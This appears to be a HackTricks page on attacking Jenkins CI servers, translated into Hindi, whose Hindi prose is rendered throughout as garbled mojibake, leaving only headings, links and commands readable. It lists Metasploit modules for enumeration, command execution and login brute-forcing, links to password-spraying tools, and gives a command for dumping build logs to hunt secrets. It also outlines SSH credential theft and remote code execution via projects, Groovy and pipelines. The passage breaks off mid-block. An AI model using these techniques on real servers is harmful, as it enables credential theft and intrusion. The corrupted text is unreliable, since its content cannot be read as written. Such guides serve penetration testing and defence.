# Jenkins Security

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

Jenkins рдПрдХ рдЙрдкрдХрд░рдг рд╣реИ рдЬреЛ рд▓рдЧрднрдЧ **рдХрд┐рд╕реА рднреА** **рдкреНрд░реЛрдЧреНрд░рд╛рдорд┐рдВрдЧ рднрд╛рд╖рд╛рдУрдВ** рдФрд░ рд╕реНрд░реЛрдд рдХреЛрдб рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдХреЗ рд╕рдВрдпреЛрдЬрди рдХреЗ рд▓рд┐рдП **рдирд┐рд░рдВрддрд░ рдПрдХреАрдХрд░рдг** рдпрд╛ **рдирд┐рд░рдВрддрд░ рд╡рд┐рддрд░рдг** (CI/CD) рд╡рд╛рддрд╛рд╡рд░рдг рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╕реАрдзрд╛ рддрд░реАрдХрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрд╣ рд╡рд┐рднрд┐рдиреНрди рдирд┐рдпрдорд┐рдд рд╡рд┐рдХрд╛рд╕ рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░рддрд╛ рд╣реИред рдЬрдмрдХрд┐ Jenkins **рд╡реНрдпрдХреНрддрд┐рдЧрдд рдЪрд░рдгреЛрдВ рдХреЗ рд▓рд┐рдП рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдмрдирд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛** рдХреЛ рд╕рдорд╛рдкреНрдд рдирд╣реАрдВ рдХрд░рддрд╛, рдпрд╣ рдирд┐рд░реНрдорд╛рдг, рдкрд░реАрдХреНрд╖рдг рдФрд░ рддреИрдирд╛рддреА рдЙрдкрдХрд░рдгреЛрдВ рдХреЗ рдкреВрд░реЗ рдЕрдиреБрдХреНрд░рдо рдХреЛ рдПрдХ рд╕рд╛рде рдЬреЛрдбрд╝рдиреЗ рдХрд╛ рдПрдХ рддреЗрдЬрд╝ рдФрд░ рдЕрдзрд┐рдХ рдордЬрдмреВрдд рддрд░реАрдХрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рдЬреЛ рдХрд┐ рдореИрдиреНрдпреБрдЕрд▓ рд░реВрдк рд╕реЗ рдЖрд╕рд╛рдиреА рд╕реЗ рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## Unauthenticated Enumeration

рдмрд┐рдирд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рджрд┐рд▓рдЪрд╕реНрдк Jenkins рдкреГрд╖реНрдареЛрдВ рдХреА рдЦреЛрдЬ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЬреИрд╕реЗ (_/people_ рдпрд╛ _/asynchPeople_, рдпрд╣ рд╡рд░реНрддрдорд╛рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рд╕реВрдЪреА рдмрдирд╛рддрд╛ рд╣реИ) рдЖрдк рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
msf> use auxiliary/scanner/http/jenkins_enum
```
рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЗ рдмрд┐рдирд╛ рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
msf> use auxiliary/scanner/http/jenkins_command
```
рдмрд┐рдирд╛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЗ рдЖрдк _**/asynchPeople/**_ рдкрде рдпрд╛ _**/securityRealm/user/admin/search/index?q=**_ рдореЗрдВ **рдпреВрдЬрд░рдиреЗрдо** рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред

рдЖрдк _**/oops**_ рдпрд╛ _**/error**_ рдкрде рд╕реЗ Jenkins рд╕рдВрд╕реНрдХрд░рдг рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

![](<../../.gitbook/assets/image (146).png>)

### рдЬреНрдЮрд╛рдд рдХрдордЬреЛрд░рд┐рдпрд╛рдБ

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## рд▓реЙрдЧрд┐рди

рдмреБрдирд┐рдпрд╛рджреА рдЬрд╛рдирдХрд╛рд░реА рдореЗрдВ рдЖрдк **Jenkins рдХреЗ рдЕрдВрджрд░ рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдХреЗ рд╕рднреА рддрд░реАрдХреЗ** рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### рдкрдВрдЬреАрдХрд░рдг

рдЖрдк рдЙрди Jenkins рдЙрджрд╛рд╣рд░рдгреЛрдВ рдХреЛ рдЦреЛрдЬрдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдВрдЧреЗ рдЬреЛ **рдЖрдкрдХреЛ рдПрдХ рдЦрд╛рддрд╛ рдмрдирд╛рдиреЗ рдФрд░ рдЗрд╕рдХреЗ рдЕрдВрджрд░ рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВред рдмрд╕ рдЗрддрдирд╛ рд╣реАред**

### **SSO рд▓реЙрдЧрд┐рди**

рдпрджрд┐ **SSO** **рдХрд╛рд░реНрдпрд╛рддреНрдордХрддрд╛**/**рдкреНрд▓рдЧрдЗрдиреНрд╕** рдореМрдЬреВрдж рдереЗ рддреЛ рдЖрдкрдХреЛ рдПрдХ рдкрд░реАрдХреНрд╖рдг рдЦрд╛рддреЗ (рдЬреИрд╕реЗ, рдПрдХ рдкрд░реАрдХреНрд╖рдг **Github/Bitbucket рдЦрд╛рддрд╛**) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ **рд▓реЙрдЧ-рдЗрди** рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред [**рдпрд╣рд╛рдБ**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/) рд╕реЗ рдЯреНрд░рд┐рдХ рдХрд░реЗрдВред

### рдмреНрд░реВрдЯрдлреЛрд░реНрд╕

**Jenkins** рдореЗрдВ **рдкрд╛рд╕рд╡рд░реНрдб рдиреАрддрд┐** рдФрд░ **рдпреВрдЬрд░рдиреЗрдо рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рд╢рдорди** рдХреА рдХрдореА рд╣реИред рдпрд╣ **рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ **рдХрдордЬреЛрд░ рдкрд╛рд╕рд╡рд░реНрдб** рдпрд╛ **рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд░реВрдк рдореЗрдВ рдпреВрдЬрд░рдиреЗрдо** рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдпрд╣рд╛рдВ рддрдХ рдХрд┐ **рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд░реВрдк рдореЗрдВ рдЙрд▓реНрдЯреЗ рдпреВрдЬрд░рдиреЗрдо** рднреА рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред
```
msf> use auxiliary/scanner/http/jenkins_login
```
### рдкрд╛рд╕рд╡рд░реНрдб рд╕реНрдкреНрд░реЗрдЗрдВрдЧ

Use [this python script](https://github.com/gquere/pwn\_jenkins/blob/master/password\_spraying/jenkins\_password\_spraying.py) or [this powershell script](https://github.com/chryzsh/JenkinsPasswordSpray).

### IP рд╡реНрд╣рд╛рдЗрдЯрд▓рд┐рд╕реНрдЯрд┐рдВрдЧ рдмрд╛рдпрдкрд╛рд╕

рдХрдИ рд╕рдВрдЧрдарди **SaaS-рдЖрдзрд╛рд░рд┐рдд рд╕реНрд░реЛрдд рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рдмрдВрдзрди (SCM) рд╕рд┐рд╕реНрдЯрдо** рдЬреИрд╕реЗ GitHub рдпрд╛ GitLab рдХреЛ **рдЖрдВрддрд░рд┐рдХ, рд╕реНрд╡рдпрдВ-рд╣реЛрд╕реНрдЯреЗрдб CI** рд╕рдорд╛рдзрд╛рди рдЬреИрд╕реЗ Jenkins рдпрд╛ TeamCity рдХреЗ рд╕рд╛рде рдорд┐рд▓рд╛рддреЗ рд╣реИрдВред рдпрд╣ рд╕реЗрдЯрдЕрдк CI рд╕рд┐рд╕реНрдЯрдо рдХреЛ **SaaS рд╕реНрд░реЛрдд рдирд┐рдпрдВрддреНрд░рдг рд╡рд┐рдХреНрд░реЗрддрд╛рдУрдВ** рд╕реЗ **рд╡реЗрдмрд╣реБрдХ рдШрдЯрдирд╛рдУрдВ** рдХреЛ **рдкреНрд░рд╛рдкреНрдд** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдиреМрдХрд░рд┐рдпреЛрдВ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред

рдЗрд╕рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╕рдВрдЧрдарди **SCM рдкреНрд▓реЗрдЯрдлрд╛рд░реНрдореЛрдВ** рдХреЗ **IP рд░реЗрдВрдЬ** рдХреЛ **рд╡реНрд╣рд╛рдЗрдЯрд▓рд┐рд╕реНрдЯ** рдХрд░рддреЗ рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рдЙрдиреНрд╣реЗрдВ **рд╡реЗрдмрд╣реБрдХ** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **рдЖрдВрддрд░рд┐рдХ CI рд╕рд┐рд╕реНрдЯрдо** рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рд╣реИред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдпрд╣ рдзреНрдпрд╛рди рд░рдЦрдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ **рдХреЛрдИ рднреА** GitHub рдпрд╛ GitLab рдкрд░ **рдЦрд╛рддрд╛** рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ **рд╡реЗрдмрд╣реБрдХ** рдХреЛ **рдЯреНрд░рд┐рдЧрд░** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ **рдЖрдВрддрд░рд┐рдХ CI рд╕рд┐рд╕реНрдЯрдо** рдХреЛ рдЕрдиреБрд░реЛрдз рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИред

Check: [https://www.paloaltonetworks.com/blog/prisma-cloud/repository-webhook-abuse-access-ci-cd-systems-at-scale/](https://www.paloaltonetworks.com/blog/prisma-cloud/repository-webhook-abuse-access-ci-cd-systems-at-scale//)

## рдЖрдВрддрд░рд┐рдХ Jenkins рджреБрд░реБрдкрдпреЛрдЧ

рдЗрди рдкрд░рд┐рджреГрд╢реНрдпреЛрдВ рдореЗрдВ рд╣рдо рдорд╛рди рд▓реЗрдВрдЧреЗ рдХрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ Jenkins рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡реИрдз рдЦрд╛рддрд╛ рд╣реИред

{% hint style="warning" %}
Jenkins рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХреА рдЧрдИ **рдЕрдзрд┐рдХрд╛рд░рд┐рддрд╛** рддрдВрддреНрд░ рдФрд░ рд╕рдордЭреМрддрд╛ рдХрд┐рдП рдЧрдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдЕрдиреБрдорддрд┐ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдЖрдк **рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╣рдорд▓реЛрдВ рдХреЛ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдирд╣реАрдВред**
{% endhint %}

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдмреБрдирд┐рдпрд╛рджреА рдЬрд╛рдирдХрд╛рд░реА рджреЗрдЦреЗрдВ:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рд╕реВрдЪреА рдмрдирд╛рдирд╛

рдпрджрд┐ рдЖрдкрдиреЗ Jenkins рддрдХ рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд▓реА рд╣реИ, рддреЛ рдЖрдк [http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/) рдореЗрдВ рдЕрдиреНрдп рдкрдВрдЬреАрдХреГрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рд╕реВрдЪреА рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред

### рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рд░рд╣рд╕реНрдпреЛрдВ рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрдорд╛рдгреЛрдВ рдХреЛ рдбрдВрдк рдХрд░рдирд╛

Use [this script](https://github.com/gquere/pwn\_jenkins/blob/master/dump\_builds/jenkins\_dump\_builds.py) to dump build console outputs and build environment variables to hopefully find cleartext secrets.
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **SSH рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдЪреБрд░рд╛рдирд╛**

рдпрджрд┐ рд╕рдордЭреМрддрд╛ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **рдПрдХ рдирдпрд╛ Jenkins рдиреЛрдб рдмрдирд╛рдиреЗ/рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд░реНрдпрд╛рдкреНрдд рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд░рдЦрддрд╛ рд╣реИ** рдФрд░ SSH рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдкрд╣рд▓реЗ рд╕реЗ рдЕрдиреНрдп рдиреЛрдбреНрд╕ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реИрдВ, рддреЛ рд╡рд╣ **рдЙрди рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рдЪреБрд░рд╛ рд╕рдХрддрд╛ рд╣реИ** рдПрдХ рдиреЛрдб рдмрдирд╛рдХрд░/рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ рдФрд░ **рдПрдХ рд╣реЛрд╕реНрдЯ рд╕реЗрдЯ рдХрд░рдХреЗ рдЬреЛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рд░рд┐рдХреЙрд░реНрдб рдХрд░реЗрдЧрд╛** рдмрд┐рдирд╛ рд╣реЛрд╕реНрдЯ рдХреБрдВрдЬреА рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд┐рдП:

![](<../../.gitbook/assets/image (218).png>)

рдЖрдк рдЖрдорддреМрд░ рдкрд░ Jenkins ssh рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ **рд╡реИрд╢реНрд╡рд┐рдХ рдкреНрд░рджрд╛рддрд╛** (`/credentials/`) рдореЗрдВ рдкрд╛рдПрдВрдЧреЗ, рдЗрд╕рд▓рд┐рдП рдЖрдк рдЙрдиреНрд╣реЗрдВ рдХрд┐рд╕реА рдЕрдиреНрдп рд░рд╣рд╕реНрдп рдХреА рддрд░рд╣ рдбрдВрдк рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [**рд░рд╣рд╕реНрдпреЛрдВ рдХреЛ рдбрдВрдк рдХрд░рдиреЗ рдХреЗ рдЕрдиреБрднрд╛рдЧ**](./#dumping-secrets) рдореЗрдВ рджреЗрдЦреЗрдВред

### **Jenkins рдореЗрдВ RCE**

Jenkins рд╕рд░реНрд╡рд░ рдореЗрдВ **рд╢реЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛** рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рд╕рднреА **рд░рд╣рд╕реНрдпреЛрдВ** рдФрд░ **env рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕** рдХреЛ рд▓реАрдХ рдХрд░рдиреЗ рдФрд░ **рдПрдХ рд╣реА рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рд╕реНрдерд┐рдд рдЕрдиреНрдп рдорд╢реАрдиреЛрдВ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ** рдХрд╛ рдЕрд╡рд╕рд░ рджреЗрддрд╛ рд╣реИ рдпрд╛ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ **рдХреНрд▓рд╛рдЙрдб рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕** рдЗрдХрдЯреНрдард╛ рдХрд░рдиреЗ рдХрд╛ рднреАред

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, Jenkins **SYSTEM рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓реЗрдЧрд╛**ред рдЗрд╕рд▓рд┐рдП, рдЗрд╕реЗ рд╕рдордЭреМрддрд╛ рдХрд░рдиреЗ рд╕реЗ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ **SYSTEM рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░** рдорд┐рд▓реЗрдВрдЧреЗред

### **RCE рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдмрдирд╛рдирд╛/рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛**

рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдмрдирд╛рдирд╛/рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛ Jenkins рд╕рд░реНрд╡рд░ рдкрд░ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рд╣реИ:

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **RCE Groovy рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛**

рдЖрдк рдПрдХ Groovy рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдХреЗ рднреА RCE рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреЛ рдПрдХ рдирдпрд╛ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдмрдирд╛рдиреЗ рдХреА рддреБрд▓рдирд╛ рдореЗрдВ рдЕрдзрд┐рдХ рдЫрд┐рдкрд╛ рд╣реБрдЖ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ:

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### RCE рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдмрдирд╛рдирд╛/рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛

рдЖрдк **рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдмрдирд╛рдХрд░/рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ рднреА RCE рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**:

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## рдкрд╛рдЗрдкрд▓рд╛рдЗрди рд╢реЛрд╖рдг

рдкрд╛рдЗрдкрд▓рд╛рдЗрдиреЛрдВ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдЕрднреА рднреА Jenkins рддрдХ рдкрд╣реБрдБрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреА рд╣реЛрдЧреАред

### рдмрд┐рд▓реНрдб рдкрд╛рдЗрдкрд▓рд╛рдЗрдиреНрд╕

**рдкрд╛рдЗрдкрд▓рд╛рдЗрдиреНрд╕** рдХреЛ **рдкреНрд░реЛрдЬреЗрдХреНрдЯреНрд╕ рдореЗрдВ рдмрд┐рд▓реНрдб рддрдВрддреНрд░ рдХреЗ рд░реВрдк рдореЗрдВ** рднреА рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЗрд╕реЗ **рд░реЗрдкреЛрдЬрд┐рдЯрд░реА рдХреЗ рдЕрдВрджрд░ рдПрдХ рдлрд╝рд╛рдЗрд▓** рдХреЗ рд░реВрдк рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдкрд╛рдЗрдкрд▓рд╛рдЗрди рд╕рд┐рдВрдЯреИрдХреНрд╕ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░реЗрдЧрд╛ред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ `/Jenkinsfile` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:

![](<../../.gitbook/assets/image (127).png>)

рдпрд╣ рднреА рд╕рдВрднрд╡ рд╣реИ рдХрд┐ **рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдЕрдиреНрдп рд╕реНрдерд╛рдиреЛрдВ рдкрд░ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд┐рдпрд╛ рдЬрд╛рдП** (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдЕрдиреНрдп рд░реЗрдкреЛрдЬрд┐рдЯрд░реА рдореЗрдВ) рдЬрд┐рд╕рдХрд╛ рд▓рдХреНрд╖реНрдп **рд░реЗрдкреЛрдЬрд┐рдЯрд░реА рдХреА рдкрд╣реБрдБрдЪ** рдФрд░ рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдкрд╣реБрдБрдЪ рдХреЛ **рдЕрд▓рдЧ рдХрд░рдирд╛** рд╣реИред

рдпрджрд┐ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдкрд╛рд╕ **рдЙрд╕ рдлрд╝рд╛рдЗрд▓ рдкрд░ рд▓рд┐рдЦрдиреЗ рдХреА рдкрд╣реБрдБрдЪ рд╣реИ** рддреЛ рд╡рд╣ рдЗрд╕реЗ **рд╕рдВрд╢реЛрдзрд┐рдд** рдХрд░ рд╕рдХреЗрдЧрд╛ рдФрд░ **рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдЯреНрд░рд┐рдЧрд░** рдХрд░ рд╕рдХреЗрдЧрд╛ рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдХреЛ рдмрд┐рдирд╛ Jenkins рддрдХ рдкрд╣реБрдБрдЪ рдХреЗред\
рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ **рдХреБрдЫ рд╢рд╛рдЦрд╛ рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдирд╛ рдкрдбрд╝реЗ** (рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдХреЗ рдЖрдзрд╛рд░ рдкрд░, рдЙрдиреНрд╣реЗрдВ рдмрд╛рдпрдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдпрд╛ рдирд╣реАрдВ)ред

рдХрд╕реНрдЯрдо рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдмрд╕реЗ рд╕рд╛рдорд╛рдиреНрдп рдЯреНрд░рд┐рдЧрд░реНрд╕ рд╣реИрдВ:

* **рдореБрдЦреНрдп рд╢рд╛рдЦрд╛** рдкрд░ **рдкреБрд▓ рдЕрдиреБрд░реЛрдз** (рдпрд╛ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдЕрдиреНрдп рд╢рд╛рдЦрд╛рдУрдВ рдкрд░)
* **рдореБрдЦреНрдп рд╢рд╛рдЦрд╛** рдкрд░ **рдкреБрд╢** (рдпрд╛ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдЕрдиреНрдп рд╢рд╛рдЦрд╛рдУрдВ рдкрд░)
* **рдореБрдЦреНрдп рд╢рд╛рдЦрд╛ рдХреЛ рдЕрдкрдбреЗрдЯ рдХрд░реЗрдВ** рдФрд░ рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░реЗрдВ рдЬрдм рддрдХ рдХрд┐ рдЗрд╕реЗ рдХрд┐рд╕реА рддрд░рд╣ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛

{% hint style="info" %}
